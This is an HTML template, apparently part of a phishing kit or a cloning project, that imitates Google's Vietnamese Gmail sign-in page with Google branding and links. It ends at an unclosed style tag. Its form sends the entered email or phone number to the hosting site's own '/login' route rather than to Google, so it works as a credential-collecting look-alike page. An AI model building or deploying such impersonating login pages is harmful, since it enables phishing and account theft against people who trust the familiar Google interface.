<form action="/login" method="POST">
    <div class="maindiv">
        <div class="click-out">
            <div class="header-google">
                <img src="img/google.png" alt="Google">
                <h2><span style="font-weight: 100;">Đăng nhập</span></h2>
                <h3>Tiếp tục tới Gmail</h3>
            </div>
        </div>
        <div class="inputs">
            <div class="Fields">
                <div class="Fieldset">
                    <input type="text" class="Before-FS" name="email" value="{{oldInput.email}}" required=""
                        autocomplete="off">
                    <div class="FsH"><span class="span-email">Email hoặc số điện thoại</span></div>
                    <label class="placeholder" style="top:19px">Email hoặc số điện thoại</label>
                </div>
                {{#if errorMessage}}
                <script>
                    document.getElementsByClassName("Before-FS")[0].style.border = '2px solid #D93025'
                    spanEmail = document.getElementsByClassName('span-email')[0].style.color = '#D93025'
                    document.getElementsByClassName("FsH")[0].classList.add("error_FsH")
                    let form_email = document.getElementsByClassName("Before-FS")[0]
                    let error_FsH = document.getElementsByClassName('error_FsH')[0]

                    form_email.onclick = function () {
                        error_FsH.style.display = 'block'
                        error_FsH.style.color = '#1a73e8'
                    }
                </script>
                <div class="user-message-error" style="display: flex; text-align:left;margin-top: 5px">
                    <img src="img/chu-y.png" alt="" style="height: 21px;">
                    <div style="font-size: 13px; color: #D93025; padding-top: 3px; margin-bottom: 5px">
                        {{errorMessage}}
                    </div>
                </div>

                {{/if}}
                <div class="quen-email" style="text-align: left; margin-top: 5px">
                    <a style="color: #1a73e8; font-weight: 600; font-size: 15px;" href="">Bạn quên địa chỉ
                        email?</a>
                </div>
            </div>
            <div class="about-laptop click-out"
                style="text-align: left; color: #5f6368; font-size: 14.6px; font-weight: 200; line-height: 1.4286; margin: 45px 0 40px 0;">
                Đây không phải máy tính của bạn? Hãy sử dụng chế độ Khách để đăng nhập một cách riêng tư. <a
                    style="color: #1a73e8; font-weight: 600;"
                    href="https://support.google.com/chrome/answer/6130773">Tìm hiểu thêm</a>
            </div>
            <div class="div-create-next" style="text-align: left; display:flex;">
                <div class="create-user"
                    style="padding-top: 7px; font-size: 14.5px; margin-left: -20px; font-weight: 500;">
                    <a style="color:#1a73e8;"
                        href="https://accounts.google.com/signup/v2/webcreateaccount?biz=false&cc=VN&continue=http%3A%2F%2Fsupport.google.com%2Fmail%2Fanswer%2F56256%3Fhl%3Dvi&dsh=S2131666562%3A1679745005834027&flowEntry=SignUp&flowName=GlifWebSignIn&hl=vi&ifkv=AQMjQ7STrTWhSvt6HIh3CmjYJeobmF25afB5GeeQaitU9hle2-EPYFC0_dbDTQHJvBtXjNXPy-S6-g">
                        Tạo tài khoản
                    </a>
                </div>
                <div class="next">
                    <button style="margin-left: 163px;" type="submit" class="btn-next">Tiếp theo</button>
                </div>

            </div>

        </div>
    </div>
</form>


<script>
    function clickOut() {
        document.getElementsByClassName('FsH')[0].style.display = 'none';
        document.getElementsByClassName('Before-FS')[0].style.borderWidth = '1px';
    }
    document.getElementsByClassName("click-out")[0].onclick = clickOut
    document.getElementsByClassName("click-out")[1].onclick = clickOut

    document.getElementsByClassName("Before-FS")[0].onclick = function () {
        document.getElementsByClassName('FsH')[0].style.display = 'block'
        document.getElementsByClassName('FsH')[0].style.color = '#1a73e8'
        document.getElementsByClassName('Before-FS')[0].style.borderWidth = '2px';
    }

</script>


<style>
